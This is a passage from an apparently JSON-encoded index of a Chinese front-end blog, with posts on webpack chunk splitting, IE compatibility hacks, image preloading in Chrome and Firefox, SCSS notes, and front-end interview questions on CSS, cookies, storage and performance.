color=\"red\">感觉这个方法比较不错</span>\n有一个地方比较特殊：组件上要用ref引用的话，这个组件不可以使用懒加载<a href=\"https://lry1994.github.io/study/2019/2.html\">https://lry1994.github.io/study/2019/2.html</a>。</p>\n<p>对于其他库文件的话，可以设置maxSize进行切割</p>\n<pre><code class=\"language-js\">optimization: {\n    splitChunks: {\n    chunks: &#39;all&#39;,\n    maxInitialRequests: 5,\n    maxSize: 244 * 1024,\n    cacheGroups: {\n        default: false,\n        vendors: {\n        test: /[\\\\/]node_modules[\\\\/]/,\n        name: &#39;vendors&#39;,\n        },\n    },\n    },\n},</code></pre>\n","index":27},{"filePath":"post\\2019\\IE-hack.md","htmlPath":"/post/2019/IE-hack.html","name":"IE-hack.md","type":"md","title":"IE hack","date":"2019/4/16","categories":"Experience","tags":"专题探究","html":"<h3 id=\"documentgetelementbyid（name不是id取节点\">document.getElementById（name不是id)取节点</h3>\n<p>在 IE6 IE7 IE8(Q) 中，支持以 document.getElementById(elementName) 的方式获取 A APPLET BUTTON FORM IFRAME IMG INPUT MAP OBJECT EMBED SELECT TEXTAREA 元素，而其他浏览器的任何元素均不支持该方式。</p>\n<p>参考</p>\n<p><a href=\"http://www.w3help.org/zh-cn/causes/SD9001\">SD9001: IE6 IE7 IE8(Q) 中的 getElementById 方法能以 name 属性为参数获取某些元素</a></p>\n<h3 id=\"ie-margin-top负值无效\">ie margin-top负值无效</h3>\n<p><a href=\"https://www.cnblogs.com/chaozhang/p/4711282.html\">https://www.cnblogs.com/chaozhang/p/4711282.html</a></p>\n<p>加上display:inline-block</p>\n<h3 id=\"ie中img被拉伸\">ie中img被拉伸</h3>\n<p>只要设置img为 height:auto，width:auto，就不会出现这种情况了</p>\n<h3 id=\"火狐和ie下hrefjavascriptvoid0-会弹出空白页\">火狐和IE下href=&quot;javascript:void(0) 会弹出空白页</h3>\n<p>本来javascript:void(0);的用处是不用整体刷新网页且返回一个空值，但这儿由于DOM本身的冒泡事件所以会最后执行HREF属性内的javascript:void(0);导致执行函数返回了一个空值，所以覆盖掉了前面正常执行函数所返回的值引起的错误。</p>\n<p>一般情况下，IE会先运行DOM本身绑定的事件，如ONCLICK;如果没有阻止冒泡，则会顺序执行HREF属性。如果想正确运行，可以在前面用RETURN FALSE终止冒泡，例如：</p>\n<pre><code>&lt;a target=&quot;_blank&quot; class=&quot;prev&quot; onclick=&quot;return false;&quot;   href=&quot;javascript:void(0);&quot;&gt;&lt;/a&gt;</code></pre><p>或者直接删去也行，如：</p>\n<pre><code>&lt;a target=&quot;_blank&quot;  class=&quot;prev&quot; &gt;&lt;/a&gt;</code></pre><p>但是后者hover的时候没有手势的pointer</p>\n<h3 id=\"arrayprototypesort-兼容\">Array.prototype.sort 兼容</h3>\n<p>IE9-- Array.prototype.sort 不能根据 对象属性 做排序</p>\n<pre><code class=\"language-javascript\">//方法1冒泡排序\nvar mySort = function(fn){\n    if(typeof fn != &#39;function&#39;){\n        fn = function(a,b){\n            return a-b;\n        }\n    }\n\n    for(var i=0; i &lt; this.length-1;i++){\n        for(var j=i+1;j&lt;this.length;j++){\n            var t = this[i];\n            if(fn(this[i],this[j]) &gt; 0){\n                this[i] = this[j];\n                this[j] = t;\n            }\n        }\n    }\n    return this;\n}\n\nif(typeof Array.prototype.sorts!= &#39;fucntion&#39;){\n    Array.prototype.sorts = mySort;\n    mySort = null;\n}\n\n\n//方法2 插入排序\nvar mySort = function(fn){\n    if(typeof fn != &#39;function&#39;){\n        fn = function(a,b){\n            return a-b;\n        }\n    }\n    for(var i=1;i&lt;this.length;i++){\n        var t = this[i];\n        var j = i-1;\n        while(j &gt;= 0 &amp;&amp; fn(this[j],t)&gt; 0 ){\n            this[j+1] = this[j];\n            j--;\n        }\n        this[j+1] = t;\n\n    }\n    return this;\n\n}\nif(typeof Array.prototype.sorts!= &#39;fucntion&#39;){\n    Array.prototype.sorts = mySort;\n    mySort = null;\n}</code></pre>\n<p>safari 不支持函数参数 </p>\n<pre><code class=\"language-javascript\">!function(window){ \n    var ua = window.navigator.userAgent.toLowerCase(), \n    reg = /msie|applewebkit.+safari/; \n    if(reg.test(ua)){ \n        var _sort = Array.prototype.sort; \n        Array.prototype.sort = function(fn){ \n            if(!!fn &amp;&amp; typeof fn === &#39;function&#39;){ \n                if(this.length &lt; 2) return this; \n                var i = 0, j = i + 1, l = this.length, tmp, r = false, t = 0; \n                for(; i &lt; l; i++){ \n                    for(j = i + 1; j &lt; l; j++){ \n                        t = fn.call(this, this[i], this[j]); \n                        r = (typeof t === &#39;number&#39; ? t : \n                        !!t ? 1 : 0) &gt; 0 \n                        ? true : false; \n                        if(r){ \n                            tmp = this[i]; \n                            this[i] = this[j]; \n                            this[j] = tmp; \n                        } \n                    } \n                } \n                return this; \n            }else{ \n                return _sort.call(this); \n            } \n        }; \n    } \n}(window); </code></pre>\n<h3 id=\"ie下-new-date2016-07-01-080000--nan\">IE下 new Date(&quot;2016-07-01 08:00:00&quot;) == NaN</h3>\n<pre><code class=\"language-js\">new Date(&quot;2016-07-01 08:00:00&quot;);//IE下NaN\nnew Date(&quot;2016/07/01 08:00:00&quot;)//IE下OK\nnew Date(&quot;2016/07/01 08:00:00。0&quot;)//IE下NaN\n</code></pre>\n<p><code>new Date(&quot;2016-07-01 08:00:00&quot;);</code>这种格式在ff,chrome,opera,safari等浏览器中没有问题的，而在IE内核浏览器（猎豹，360兼容模式）等会出现无效NaN的问题，</p>\n<p><code>new Date(&quot;2016-07-01 08:10:00&quot;).replace(/-/g,&quot;/&quot;);</code>这样确保了任何一个浏览器都没有问题。</p>\n<h3 id=\"ie-hash有变化，但是页面无刷新\">IE hash有变化，但是页面无刷新</h3>\n<p>在页面框架内，使用location.href = href进行路由跳转时，IE9+环境会有问题，即hash有变化，但是页面无刷新。</p>\n<pre><code class=\"language-javascript\">function fixRouterIE(vm){\n    //IE 11下\n    if (\n      &#39;-ms-scroll-limit&#39; in document.documentElement.style &amp;&amp; \n      &#39;-ms-ime-align&#39; in document.documentElement.style\n    ) { \n      window.addEventListener(&quot;hashchange&quot;, function(event) {\n        const currentPath = window.location.hash.slice(1);\n\n        if (vm._route.path !== currentPath) {\n          vm._router.push(currentPath)\n        }\n      }, false)\n    }\n}</code></pre>\n","index":28},{"filePath":"post\\2019\\preload.md","htmlPath":"/post/2019/preload.html","name":"preload.md","type":"md","title":"图片预加载探究","date":"2019/4/16","categories":"Experience","tags":"专题探究","html":"<pre><code>\n    /**\n     * 预加载\n     * @param {Array} dataList  预加载数据\n     * @param {Array} attrArray 预加载属性，可选\n     */\n    export function  preLoad(dataList,attrList){\n      //若有指定对象属性\n      let imgList = [];\n      if(attrList){\n        dataList.forEach(element =&gt; {\n          attrList.forEach(attr=&gt;{\n            if(element[attr]){\n              const img = new Image();\n              img.src = element[attr];\n              imgList.push(img);\n\n            } \n          })\n        });\n      }else{\n        dataList.forEach(element =&gt; { \n          const img = new Image();\n          img.src = element;\n          imgList.push(img);       \n        });\n      }\n\n      return imgList;\n    }</code></pre><h2 id=\"测试浏览器：chrome、firefox\"><strong>测试浏览器：chrome、firefox</strong></h2>\n<blockquote>\n<p>在Firefox下并没有from memory cache以及from disk cache的状态展现 相同的资源在chrome下是from\ndisk/memory cache，但是Firefox统统是304状态码\n即Firefox下会缓存资源，但是每次都会请求服务器对比当前缓存是否更改，chrome不请求服务器，直接拿过来用</p>\n</blockquote>\n<blockquote>\n<p>200 OK (from disk cache) 是浏览器没有跟服务器确认， 就是它直接用浏览器缓存。 304\n是浏览器和服务器确认了一次缓存有效性，再用的缓存。客户端和服务器端只需要传输很少的数据量来做文件的校验，如果文件没有修改过，则不需要返回全量的数据。能够节省大量的网络带宽，并减少了页面的渲染时间。</p>\n</blockquote>\n<h1 id=\"图片img的预加载\">图片img的预加载</h1>\n<h2 id=\"方法一直接用src进行预加载但不保存\">方法一:直接用src进行预加载,但不保存</h2>\n<pre><code> &lt;img :src=&quot;data[current].imagePath&quot;&gt;\n mounted() {  \n     preLoad(this.data,[&#39;imagePath&#39;]);\n}</code></pre><p><strong>结果：</strong></p>\n<ol>\n<li><p>谷歌 切换图片速度快，确实有预加载. 初次 200  disk cache。</p>\n<p>切换没有发XHR，发了Img。200 OK (from disk cache) 是浏览器没有跟服务器确认，即直接用浏览器缓存。</p>\n</li>\n</ol>\n<ol start=\"2\">\n<li><p>火狐切换图片速度慢，并没有预加载 初次，没有“已缓存”标识。</p>\n<p>第一次切换,还是发了请求</p>\n<p>第二次切换，正常没有请求（默认情况下状态码为200的响应可以被缓存）。\n所以火狐预加载并没有成功。</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"方法二：-把预加载的挂载到data上（最好）\">方法二： 把预加载的挂载到data上（最好）</h2>\n<p><strong>结果：</strong>火狐、谷歌表现一致，都切换较快，没有发请求</p>\n<pre><code>&lt;div ref=&quot;solution-img&quot;&gt;&lt;/div&gt;\nmounted() {    \n    this.preLoadImg = preLoad(this.data,[&#39;bgimagePath&#39;]);\n}\nmethods: {\n    changeActive(index) {\n      this.current = index;\n      let dom = this.$refs[&#39;solution-img&#39;];\n      if(dom.childNodes.length &gt; 0) dom.removeChild(dom.childNodes[0]);\n      dom.appendChild(this.preLoadImg[index]);\n    }\n\n  },</code></pre><h1 id=\"背景图片的预加载\">背景图片的预加载</h1>\n<p><strong>不做任何处理结果</strong>：第一次请求返回200。第一次加载后都是304</p>\n<hr>\n<h2 id=\"方法一-：使用css预加载\">方法一 ：使用css预加载</h2>\n<pre><code>#preload-01 { background:  url(&#39;~@/assets/img/market/icon-00.png&#39;) no-repeat -9999px -9999px; }    \n#preload-02 { background:  url(&#39;~@/assets/img/market/icon-01.png&#39;) no-repeat -9999px -9999px; }    </code></pre><p><strong>结果：</strong> 和不处理表现一致。初次加载也没有请求这些图片。</p>\n<h2 id=\"方法二：src预加载，但不保存\">方法二：src预加载，但不保存</h2>\n<pre><code>{\n background-image: url(&#39;~@/assets/img/market/icon-10.png&#39;)  ;       \n &amp;:hover{  background-image:url(&#39;~@/assets/img/market/icon-11.png&#39;)}\n}\nmyPreLoad(){\n      let images = [  \n        require(&#39;@/assets/img/market/icon-10.png&#39;),\n        require(&#39;@/assets/img/market/icon-11.png&#39;),\n      ];\n      preLoad(images);</code></pre><p>   }</p>\n<p><strong>结果：</strong> 第一次hover 状态码304。之后切换没有发请求。火狐和谷歌表现一致，都是304</p>\n<h2 id=\"方法三：把预加载的挂载到data上\">方法三：把预加载的挂载到data上</h2>\n<pre><code>handleMouseenter(index){\nthis.getDom(index).style.backgroundImage = &quot;url(&quot; +this.preLoadImage[index*2+1].src + &quot;)&quot;;\n\n},</code></pre><p><strong>结果：</strong> 谷歌切换没有发请求。但是火狐会发请求，并返回304。</p>\n<h2 id=\"方法四：雪碧图（最好）\">方法四：雪碧图（最好）</h2>\n<pre><code>.backgroud-box{\n  width: 137px ;\n  height: 113px;\n  background-image: url(&#39;./icon-1.png&#39;) ;    \n  background-position-x:100%;\n  background-position-y:0;\n}\n\n&amp;:hover&gt;.backgroud-box { background-position-y:-113px;} </code></pre><p>以上方法都会出现切换背景图片闪烁。用这个方法位移背景就不会。而且第一次加载就把图片下载下来了，切换也不会发请求，因为用的是同一张图</p>\n<h1 id=\"个人结论\">个人结论</h1>\n<p>1、因为</p>\n<blockquote>\n<p>在Firefox下并没有from memory cache以及from disk cache的状态展现。 相同的资源在chrome下是from\ndisk/memory cache，但是Firefox统统是304状态码</p>\n</blockquote>\n<p>所以火狐下每次操作到src或者url都要发出请求。</p>\n<p>2、刚好<img>标签是一个Image对象，可以直接插入html，所以可以保存在data上缓存。304请求虽然也是可以缩短渲染时间，但是直接保存在data上可以免去一次请求，响应时间更快。</p>\n<p>3、背景图片涉及到改变url，所以没办法直接用保存在data上的数据。</p>\n","index":29},{"filePath":"post\\2019\\scss.md","htmlPath":"/post/2019/scss.html","name":"scss.md","type":"md","title":"scss笔记","date":"2019/2/28","categories":"Reading","tags":"日常记录","html":"<h3 id=\"嵌套css-规则\">嵌套CSS 规则</h3>\n<pre><code class=\"language-scss\">border: 1px solid #ccc {\n  left: 0px;\n  right: 0px;\n  }</code></pre>\n<p>css只有执行到@import时，浏览器才会去下载其他css文件，这导致页面加载起来特别慢。sass的@import规则在生成css文件时就把相关文件导入进来。这意味着所有相关的样式被归纳到了同一个css文件中，而无需发起额外的下载请求</p>\n<p>sass局部文件的文件名以下划线开头。这样，sass就不会在编译时单独编译这个文件输出css，而只把这个文件用作导入。</p>\n<h3 id=\"变量默认值\">变量默认值</h3>\n<p><code>$fancybox-width: 400px !default;</code>\n在上例中，如果用户在导入你的sass局部文件之前声明了一个$fancybox-width变量，那么你的局部文件中对$fancybox-width赋值400px的操作就无效。</p>\n<h3 id=\"css-中导入scss\">css 中导入scss</h3>\n<p>sass导入到一个CSS规则内，如下所示：</p>\n<pre><code class=\"language-scss\">.blue-theme {@import &quot;_blue-theme.scss&quot;}\n\n//生成的结果跟你直接在.blue-theme选择器内写_blue-theme.scss文件的内容完全一样。\n\n.blue-theme {\n  aside {\n    background: blue;\n    color: #fff;\n  }\n}</code></pre>\n<h3 id=\"与css-import区别\">与css @import区别</h3>\n<p>尽管通常在sass中使用@import时，sass会尝试找到对应的sass文件并导入进来，但在下列三种情况下会生成原生的CSS@import，尽管这会造成浏览器解析css时的额外下载：</p>\n<ol>\n<li>被导入文件的名字以.css结尾；</li>\n<li>被导入文件的名字是一个URL地址（比如<a href=\"http://www.sass.hk/css/css.css%EF%BC%89%EF%BC%8C%E7%94%B1%E6%AD%A4%E5%8F%AF%E7%94%A8%E8%B0%B7%E6%AD%8C%E5%AD%97%E4%BD%93API%E6%8F%90%E4%BE%9B%E7%9A%84%E7%9B%B8%E5%BA%94%E6%9C%8D%E5%8A%A1%EF%BC%9B\">http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务；</a></li>\n<li>被导入文件的名字是CSS的url()值。</li>\n</ol>\n<h3 id=\"静默注释\">静默注释</h3>\n<p>在原生的css中，注释对于其他人是直接可见的,scss中</p>\n<pre><code class=\"language-scss\">body {\n  color: #333; // 这种注释内容不会出现在生成的css文件中\n  padding: 0; /* 这种注释内容会出现在生成的css文件中 */\n}</code></pre>\n<h3 id=\"mixin\">mixin</h3>\n<p>判断一组属性是否应该组合成一个混合器，一条经验法则就是你能否为这个混合器想出一个好的名字。如果你能找到一个很好的短名字来描述这些属性修饰的样式，比如rounded-cornersfancy-font或者no-bullets，那么往往能够构造一个合适的混合器。如果你找不到，这时候构造一个混合器可能并不合适。</p>\n<pre><code class=\"language-scss\">@mixin link-colors($normal, $hover, $visited) {\n  color: $normal;\n  &amp;:hover { color: $hover; }\n  &amp;:visited { color: $visited; }\n}\n//调用\na {\n  @include link-colors(blue, red, green);\n}\n//或者\na {\n    @include link-colors(\n      $normal: blue,\n      $visited: green,\n      $hover: red\n  );\n}</code></pre>\n<p>设置默认值</p>\n<pre><code class=\"language-scss\">@mixin set-position($position: relative, $left: -1, $right: -1, $top: -1, $bottom: -1 ){\n    position: $position;\n    @if $left != -1 { left: $left; }\n    @if $right != -1 { right: $right; }\n    @if $top != -1 { top: $top; }\n    @if $bottom != -1 { bottom: $bottom; }\n}\n\n@include set-position($position: absolute, $top: 50%);</code></pre>\n<h3 id=\"选择器继承-extend\">选择器继承 @extend</h3>\n<p>.seriousError不仅会继承.error自身的所有样式，任何跟.error有关的组合选择器样式也会被.seriousError以组合选择器的形式继承，如下代码:</p>\n<pre><code class=\"language-scss\">//通过选择器继承继承样式\n.seriousError {\n  @extend .error;\n  border-width: 3px;\n}\n\n\n//.seriousError从.error继承样式\n.error a{  //应用到.seriousError a\n  color: red;\n  font-weight: 100;\n}\nh1.error { //应用到hl.seriousError\n  font-size: 1.2rem;\n}</code></pre>\n<p>继承一个html元素的样式,你对html元素添加的所有样式都会被继承。</p>\n<p>不要在css规则中使用后代选择器（比如.foo .bar）去继承css规则。如果你这么做，同时被继承的css规则有通过后代选择器修饰的样式，生成css中的选择器的数量很快就会失控</p>\n<h1 id=\"文档\">文档</h1>\n<h3 id=\"父选择器\">父选择器 &amp;</h3>\n<pre><code class=\"language-scss\">#main {\n  color: black;\n  &amp;-sidebar { border: 1px solid; }\n}\n//编译为\n\n#main { color: black; }\n#main-sidebar {border: 1px solid; }</code></pre>\n<p>当父选择器含有不合适的后缀时，Sass 将会报错。</p>\n<h3 id=\"注释\">注释</h3>\n<p>将 ! 作为多行注释的第一个字符表示在压缩输出模式下保留这条注释并输出到 CSS 文件中，通常用于添加版权信息。</p>\n<pre><code class=\"language-scss\">$version: &quot;1.2.3&quot;;\n/* This CSS is generated by My Snazzy Framework version #{$version}. */\n//编译为\n\n/* This CSS is generated by My Snazzy Framework version 1.2.3. */</code></pre>\n<h3 id=\"global\">!global</h3>\n<p>将局部变量转换为全局变量可以添加 !global 声明：</p>\n<pre><code class=\"language-scss\">#main {\n  $width: 5em !global;\n  width: $width;\n}</code></pre>\n<h3 id=\"颜色值运算\">颜色值运算</h3>\n<pre><code class=\"language-scss\">$translucent-red: rgba(255, 0, 0, 0.5);\np {\n  color: opacify($translucent-red, 0.3);\n  background-color: transparentize($translucent-red, 0.25);\n}\n编译为\n\np {\n  color: rgba(255, 0, 0, 0.8);\n  background-color: rgba(255, 0, 0, 0.25); }</code></pre>\n","index":30},{"filePath":"post\\Comprehensive\\interview.md","htmlPath":"/post/Comprehensive/interview.html","name":"interview.md","type":"md","title":"面试题摘录","date":"2018/5/5","categories":"Collection","tags":"面经","html":"<h3 id=\"vue数据双向绑定的原理\">vue数据双向绑定的原理</h3>\n<p>主要讲了实现是基于Object.defineProperty\n另外也大概阐述了<code>发布-订阅者模式</code>，主要是Observer，Dep，Watcher等</p>\n<h3 id=\"jsonp可以用post请求吗？为什么？\">JSONP可以用post请求吗？为什么？</h3>\n<p>不支持\n因为script标签只支持get请求...</p>\n<h3 id=\"描述一下css的盒模型\">描述一下css的盒模型</h3>\n<p>标准盒模型和怪异模式</p>\n<p>标准模式：box-sizing:content-box;</p>\n<p>怪异模式：box-sizing:border-box;</p>\n<h3 id=\"h5异步上传文件\">H5异步上传文件</h3>\n<p>关键代码</p>\n<pre><code class=\"language-javascript\"> &lt;input id=&quot;uploadFile&quot; type=&quot;file&quot; name=&quot;myPhoto&quot; /&gt; \n\n var fd = new FormData();//新建FormData\n fd.append(&quot;myPhoto&quot;, $(&quot;uploadFile&quot;).files[0]);//塞数据\n\n var xhr = new XMLHttpRequest(); //创建XMLHttpRequest 对象\n xhr.open(&quot;post&quot;,&quot;/uploadPhoto.action&quot;, true);//打开链接\n xhr.onreadystatechange = function() {//监听\n    if (xhr.readyState == 4) {\n        var flag = xhr.responseText;\n        if (flag == &quot;success&quot;) {\n            alert(&quot;图片上传成功！&quot;);\n        } else {\n            alert(&quot;图片上传成功！&quot;);\n        };                        \n\n    };\n}; \nxhr.send(fd);//发送</code></pre>\n<h3 id=\"实现垂直水平居中有哪些方法\">实现垂直水平居中有哪些方法</h3>\n<ol>\n<li><p>flexbox</p>\n</li>\n<li><p>绝对定位+margin负值(子容器宽高固定)</p>\n<pre><code class=\"language-css\"> childElement{\n     position:absolute;                              \n     height:200px;\n     width:400px;           \n     top:50%;      \n     left:50%;                          \n     margin-top:-100px;/*高度的一半*/\n     margin-left:-200px;/*宽度的一半*/                                         \n }            \n</code></pre>\n</li>\n</ol>\n<pre><code>3. 绝对定位top left right bottom 0 + margin auto (子容器宽高固定)\n```css\nchilElement{\n    height: 150px;\n    width: 150px;\n    position: absolute;\n    top: 0;\n    left: 0;\n    right: 0;\n    bottom: 0;\n    margin: auto;\n}</code></pre><ol start=\"4\">\n<li>绝对定位+transfrom负值（子容器宽高不知)</li>\n</ol>\n<p>（1） 不知道自己高度和父容器高度的情况下, 利用绝对定位只需要以下三行：</p>\n<pre><code class=\"language-css\">parentElement{\n    position:relative;\n}\n\nchildElement{\n    position: absolute;\n    top: 50%;\n    transform: translateY(-50%);\n\n}\n</code></pre>\n<p> （2）若父容器下只有一个元素，且父元素设置了高度，则只需要使用相对定位即可</p>\n<pre><code class=\"language-css\"> parentElement{\n    height:xxx;\n}\n\nchildElement {\n    position: relative;\n    top: 50%;\n    transform: translateY(-50%);\n}</code></pre>\n<h3 id=\"请你谈谈cookie的弊端\">请你谈谈Cookie的弊端</h3>\n<p>cookie虽然在持久保存客户端数据提供了方便，分担了服务器存储的负担，但还是有很多局限性的。\n第一：每个特定的域名下最多生成20个cookie</p>\n<ol>\n<li>IE6或更低版本最多20个cookie</li>\n<li>IE7和之后的版本最后可以有50个cookie。</li>\n<li>Firefox最多50个cookie</li>\n<li>chrome和Safari没有做硬性限制\nIE和Opera 会清理近期最少使用的cookie，Firefox会随机清理cookie。</li>\n</ol>\n<p>cookie的最大大约为4096字节，为了兼容性，一般不能超过4095字节。</p>\n<p>IE 提供了一种存储可以持久化用户数据，叫做<code>uerData</code>，从IE5.0就开始支持。每个数据最多128K，每个域名下最多1M。这个持久化数据放在缓存中，如果缓存没有清理，那么会一直存在。</p>\n<p>优点：极高的扩展性和可用性</p>\n<ol>\n<li>通过良好的编程，控制保存在cookie中的session对象的大小。</li>\n<li>通过加密和安全传输技术（SSL），减少cookie被破解的可能性。</li>\n<li>只在cookie中存放不敏感数据，即使被盗也不会有重大损失。</li>\n<li>控制cookie的生命期，使之不会永远有效。偷盗者很可能拿到一个过期的cookie。</li>\n</ol>\n<p>缺点：</p>\n<ol>\n<li><p><code>Cookie</code>数量和长度的限制。每个domain最多只能有20条cookie，每个cookie长度不能超过4KB，否则会被截掉。</p>\n</li>\n<li><p>安全性问题。如果cookie被人拦截了，那人就可以取得所有的session信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。</p>\n</li>\n<li><p>有些状态不可能保存在客户端。例如，为了防止重复提交表单，我们需要在服务器端保存一个计数器。如果我们把这个计数器保存在客户端，那么它起不到任何作用。</p>\n</li>\n</ol>\n<h3 id=\"web-storage和cookie的区别\">web storage和cookie的区别</h3>\n<p>Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。</p>\n<p>除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。</p>\n<p>但是Cookie也是不可以或缺的：Cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生</p>\n<p>浏览器的支持除了IE７及以下不支持外，其他标准浏览器都完全支持(ie及FF需在web服务器里运行)，值得一提的是IE总是办好事，例如IE7、IE6中的UserData其实就是javascript本地存储的解决方案。通过简单的代码封装可以统一到所有的浏览器都支持web storage。</p>\n<p>localStorage和sessionStorage都具有相同的操作方法，例如setItem、getItem和removeItem等</p>\n<h3 id=\"css中-link-和import-的区别是？\">CSS中 link 和@import 的区别是？</h3>\n<p>(1) link属于HTML标签，而@import是CSS提供的; </p>\n<p>(2) 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;</p>\n<p>(3) import只在IE5以上才能识别，而link是HTML标签，无兼容问题; </p>\n<p>(4) link方式的样式的权重 高于@import的权重.</p>\n<h3 id=\"对bfc规范的理解？\">对BFC规范的理解？</h3>\n<p>BFC，块级格式化上下文，一个创建了新的BFC的盒子是独立布局的，盒子里面的子元素的样式不会影响到外面的元素。在同一个 BFC 中的两个毗邻的块级盒在垂直方向（和布局方向有关系）的 margin 会发生折叠。</p>\n<p>W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行布局，以及与其他元素的关系和相互作用。</p>\n<h3 id=\"说说你对语义化的理解？\">说说你对语义化的理解？</h3>\n<ol>\n<li>去掉或者丢失样式的时候能够让页面呈现出清晰的结构</li>\n<li>有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；</li>\n<li>方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；</li>\n<li>便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</li>\n</ol>\n<h3 id=\"清除浮动的技巧\">清除浮动的技巧</h3>\n<ol>\n<li>使用空标签清除浮动。</li>\n</ol>\n<p>这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。</p>\n<ol start=\"2\">\n<li>使用overflow。</li>\n</ol>\n<p>给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。</p>\n<ol start=\"3\">\n<li>使用after伪对象清除浮动。</li>\n</ol>\n<p>该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；</p>\n<ol start=\"4\">\n<li>浮动外部元素</li>\n</ol>\n<h3 id=\"清除浮动的几种方式，各自的优缺点\">清除浮动的几种方式，各自的优缺点</h3>\n<ol>\n<li>使用空标签清除浮动 clear:both(理论上能清除任何标签，但是这样会增加无意义的标签)</li>\n<li>使用overflow:auto(空标签元素清除浮动而不得不增加无意义代码的弊端,使用zoom:1用于兼容IE)</li>\n<li>使用afert伪元素清除浮动(用于非IE浏览器)</li>\n</ol>\n<h3 id=\"减少页面加载时间的方法\">减少页面加载时间的方法</h3>\n<ol>\n<li>优化图片 </li>\n<li>图像格式的选择（GIF：提供的颜色较少，可用在一些对颜色要求不高的地方） </li>\n<li>优化CSS（压缩合并css，如 margin-top, margin-left...) </li>\n<li>网址后加斜杠（如<a href=\"http://www.campr.com/%E7%9B%AE%E5%BD%95%EF%BC%8C%E4%BC%9A%E5%88%A4%E6%96%AD%E8%BF%99%E4%B8%AA%E7%9B%AE%E5%BD%95%E6%98%AF%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%EF%BC%8C%E6%88%96%E8%80%85%E6%98%AF%E7%9B%AE%E5%BD%95%E3%80%82%EF%BC%89\">www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）</a> </li>\n<li>标明高度和宽度（如果浏览器没有找到这两个参数，它需要一边下载图片一边计算大小，如果图片很多，浏览器需要不断地调整页面。这不但影响速度，也影响浏览体验。 \n当浏览器知道了高度和宽度参数后，即使图片暂时无法显示，页面上也会腾出图片的空位，然后继续加载后面的内容。从而加载时间快了，浏览体验也更好了） </li>\n<li>减少http请求（合并文件，合并图片）</li>\n</ol>\n<h3 id=\"你都使用哪些工具来测试代码的性能？\">你都使用哪些工具来测试代码的性能？</h3>\n<ol>\n<li>Profiler</li>\n<li>JSPerf（<a href=\"http://jsperf.com/nexttick-vs-setzerotimeout-vs-settimeout%EF%BC%89\">http://jsperf.com/nexttick-vs-setzerotimeout-vs-settimeout）</a></li>\n<li>Dromaeo</li>\n</ol>\n<h3 id=\"new操作符具体干了什么呢\">new操作符具体干了什么呢?</h3>\n<p>参考答案</p>\n<ol>\n<li>创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型</li>\n<li>属性和方法被加入到 this 引用的对象中</li>\n<li>新创建的对象由 this 所引用，并且最后隐式的返回 this</li>\n</ol>\n<pre><code class=\"language-javascript\">var obj  = {};\nobj.__proto__ = Base.prototype;\nBase.call(obj); </code></pre>\n<h3 id=\"js延迟加载的方式有哪些？\">js延迟加载的方式有哪些？</h3>\n<ol>\n<li>defer和async</li>\n<li>动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）</li>\n<li>按需异步载入js</li>\n</ol>\n<h3 id=\"如何解决跨域问题\">如何解决跨域问题?</h3>\n<ol>\n<li>jsonp（jsonp 的原理是动态插入 script 标签）</li>\n<li>document.domain + iframe</li>\n<li>window.name、window.postMessage</li>\n<li>服务器上设置代理页面</li>\n</ol>\n<h3 id=\"哪些操作会造成内存泄漏？\">哪些操作会造成内存泄漏？</h3>\n<p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。</p>\n<p>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p>\n<ol>\n<li>setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。</li>\n<li>闭包</li>\n<li>控制台日志</li>\n<li>循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</li>\n</ol>\n<h3 id=\"哪些性能优化的方法？\">哪些性能优化的方法？</h3>\n<ol>\n<li>减少http请求次数：CSS Sprites, JS、CSS 源码压缩、图片大小控制合适；网页 Gzip，CDN 托管，data 缓存 ，图片服务器</li>\n<li>前端模板 JS + 数据，减少由于HTML标签导致的带宽浪费，前端用变量保存 AJAX 请求结果，每次操作本地变量，不用请求，减少请求次数</li>\n<li>用 innerHTML 代替 DOM 操作，减少 DOM 操作次数，优化 javascript 性能</li>\n<li>当需要设置的样式很多时设置 className 而不是直接操作 style</li>\n<li>少用全局变量、缓存DOM节点查找的结果。减少 IO 读取操作</li>\n<li>避免使用 CSS Expression（css表达式)又称 Dynamic properties(动态属性)</li>\n<li>图片预加载，将样式表放在顶部，将脚本放在底部，加上时间戳</li>\n</ol>\n<h3 id=\"ie-各版本和-chrome-可以并行下载多少个资源\">ie 各版本和 chrome 可以并行下载多少个资源</h3>\n<ol>\n<li>IE6 2 个并发</li>\n<li>iE7 升级之后的 6 个并发，之后版本也是 6 个</li>\n<li>Firefox，chrome 也是6个</li>\n</ol>\n<h3 